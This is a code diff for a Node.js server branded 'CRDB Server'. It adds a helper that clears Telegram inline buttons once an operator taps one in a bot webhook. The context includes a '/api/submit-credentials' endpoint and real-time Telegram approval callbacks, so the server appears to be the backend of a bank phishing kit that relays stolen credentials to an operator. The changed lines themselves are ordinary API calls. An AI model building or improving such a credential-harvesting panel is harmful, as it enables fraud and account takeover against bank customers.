@@ -59,6 +59,23 @@ async function answerCallbackQuery(callbackQueryId, text = '') {
   }
 }
 
+async function removeInlineKeyboard(chatId, messageId) {
+  try {
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageReplyMarkup`;
+    await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: chatId,
+        message_id: messageId,
+        reply_markup: { inline_keyboard: [] }
+      })
+    });
+  } catch (err) {
+    console.error('Failed to remove keyboard:', err);
+  }
+}
+
 // 1. Submit Credentials
 app.post('/api/submit-credentials', async (req, res) => {
   try {
@@ -184,8 +201,12 @@ app.post('/api/telegram-webhook', async (req, res) => {
     if (update.callback_query) {
       const callbackQueryId = update.callback_query.id;
       const data = update.callback_query.data; 
+      const chatId = update.callback_query.message.chat.id;
+      const messageId = update.callback_query.message.message_id;
       
+      // Acknowledge tap and remove inline keyboard buttons immediately
       await answerCallbackQuery(callbackQueryId, 'Imepokelewa!');
+      await removeInlineKeyboard(chatId, messageId);
 
       const underscoreIndex = data.indexOf('_');
       const action = data.substring(0, underscoreIndex);
@@ -239,4 +260,4 @@ app.post('/api/telegram-webhook', async (req, res) => {
 
 const PORT = process.env.PORT || 10000;
 app.listen(PORT, () => console.log(`CRDB Server running on port ${PORT}`));
-                                 
+        
